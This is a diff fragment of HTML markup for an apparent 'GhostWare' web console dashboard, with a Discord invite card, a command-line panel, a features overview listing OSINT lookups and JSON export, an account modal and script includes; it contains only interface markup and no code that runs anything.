+                <path d="M60.1045 4.8978C55.5792 2.8214 50.7265 1.2916 45.6527 0.41542C45.5603 0.39851 45.468 0.440769 45.4204 0.525289C44.7963 1.6353 44.105 3.0834 43.6209 4.2216C38.1637 3.4046 32.7345 3.4046 27.3892 4.2216C26.905 3.0581 26.1886 1.6353 25.5617 0.525289C25.5141 0.443589 25.4218 0.40133 25.3294 0.41542C20.2584 1.2888 15.4057 2.8186 10.8776 4.8978C10.8384 4.9147 10.8048 4.9429 10.7825 4.9795C1.57795 18.7309 -0.943561 32.1443 0.293408 45.3914C0.299005 45.4562 0.335386 45.5182 0.385761 45.5576C6.45866 50.0174 12.3413 52.7249 18.1147 54.5195C18.2071 54.5477 18.305 54.5139 18.3638 54.4378C19.7295 52.5728 20.9469 50.6063 21.9907 48.5383C22.0523 48.4172 21.9935 48.2735 21.8676 48.2256C19.9366 47.4931 18.0979 46.6 16.3292 45.5858C16.1893 45.5041 16.1781 45.304 16.3068 45.2082C16.679 44.9293 17.0513 44.6391 17.4067 44.3461C17.471 44.2926 17.5606 44.2813 17.6362 44.3151C29.2558 49.6202 41.8354 49.6202 53.3179 44.3151C53.3935 44.2785 53.4831 44.2898 53.5502 44.3433C53.9057 44.6363 54.2779 44.9293 54.6529 45.2082C54.7816 45.304 54.7732 45.5041 54.6333 45.5858C52.8646 46.6197 51.0259 47.4931 49.0921 48.2228C48.9662 48.2707 48.9102 48.4172 48.9718 48.5383C50.038 50.6034 51.2554 52.5699 52.5959 54.435C52.6519 54.5139 52.7526 54.5477 52.845 54.5195C58.6464 52.7249 64.529 50.0174 70.6019 45.5576C70.6551 45.5182 70.6887 45.459 70.6943 45.3942C72.1747 30.0791 68.2147 16.7757 60.1968 4.9823C60.1772 4.9429 60.1437 4.9147 60.1045 4.8978ZM23.7259 37.3253C20.2276 37.3253 17.3451 34.1136 17.3451 30.1693C17.3451 26.225 20.1717 23.0133 23.7259 23.0133C27.308 23.0133 30.1626 26.2532 30.1066 30.1693C30.1066 34.1136 27.28 37.3253 23.7259 37.3253ZM47.3178 37.3253C43.8196 37.3253 40.9371 34.1136 40.9371 30.1693C40.9371 26.225 43.7636 23.0133 47.3178 23.0133C50.9 23.0133 53.7545 26.2532 53.6986 30.1693C53.6986 34.1136 50.9 37.3253 47.3178 37.3253Z" fill="currentColor"/>
+              </g>
+              <defs>
+                <clipPath id="clip0">
+                  <rect width="71" height="55" fill="white"/>
+                </clipPath>
+              </defs>
+            </svg>
+          </div>
+          <div class="discord-content">
+            <h3>Join The Discord?</h3>
+            <p>Connect with the GhostWare community, get support, and stay updated with the latest features.</p>
+            <button class="btn" id="join-discord-btn" style="width:auto;padding:11px 24px;margin-top:12px;">Join Server</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ COMMANDS ============ -->
+    <section class="page" data-view="commands">
+      <div class="page-title">Commands <span class="badge">Console</span></div>
+      <div class="page-desc">Type a command below. Start with <b>/</b> to run it. Try <b>/help</b>.</div>
+
+      <div class="panel">
+        <div class="panel-head"><h3>Command line</h3><a data-cmd="/help">/help</a></div>
+        <div class="search-row">
+          <input type="text" id="cmd-input" placeholder="/examplecommand" autocomplete="off" spellcheck="false" style="font-family:var(--mono);" />
+          <button class="btn" style="width:auto;padding:11px 18px;" id="cmd-run">Run</button>
+        </div>
+        <div class="msg" id="cmd-msg"></div>
+      </div>
+
+      <div class="panel" style="margin-top:18px;">
+        <div class="panel-head"><h3>Output</h3><a id="cmd-clear" style="cursor:pointer;">Clear</a></div>
+        <div id="cmd-out" class="cmd-out"><div class="cmd-empty">No output yet — run a command above.</div></div>
+      </div>
+    </section>
+
+    <!-- ============ STATIC INFO PAGES ============ -->
+    <section class="page" data-view="features">
+      <div class="page-title">Features <span class="badge">Overview</span></div>
+      <div class="page-desc">Everything included with your GhostWare console.</div>
+      <div class="grid-cards">
+        <div class="card"><div class="card-label">Speed</div><div class="card-val" style="font-size:22px;">Real-time</div><div class="card-note">Sub-second lookups</div></div>
+        <div class="card"><div class="card-label">Modules</div><div class="card-val">7+</div><div class="card-note">OSINT sources</div></div>
+        <div class="card"><div class="card-label">Privacy</div><div class="card-val" style="font-size:22px;">No logs</div><div class="card-note">Queries not stored</div></div>
+        <div class="card"><div class="card-label">Export</div><div class="card-val" style="font-size:22px;">JSON</div><div class="card-note">API-ready output</div></div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<div id="toast"></div>
+
+<!-- User Account Modal -->
+<div id="user-modal" class="modal" style="display:none">
+  <div class="modal-backdrop" data-close></div>
+  <div class="modal-card">
+    <div class="modal-head">
+      <h3>Account</h3>
+      <button class="modal-close" data-close>×</button>
+    </div>
+    <div class="modal-body" id="user-modal-body">
+      <div class="user-card">
+        <div class="pfp" id="um-pfp">?</div>
+        <div>
+          <div class="um-name" id="um-name">—</div>
+          <span class="owner-badge" id="um-badge" style="display:none">OWNER</span>
+          <div class="um-email" id="um-email">—</div>
+          <div class="um-meta" id="um-meta">—</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="./js/logo.js"></script>
+<script src="./js/auth.js"></script>
+<script src="./js/modules.js"></script>
+<script src="./js/effects.js"></script>
+<script src="./js/connections.js"></script>
+<script src="./js/sizecontrol.js"></script>
+<script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
+<script src="./js/chat.js"></script>
+<script src="./js/virustotal.js"></script>
+<script src="./js/filebuilder.js"></script>
+<script src="./js/commands.js"></script>
+<script src="./js/theme.js"></script>
+<script src="./js/dashboard.js"></script>
+</body>
+</html>
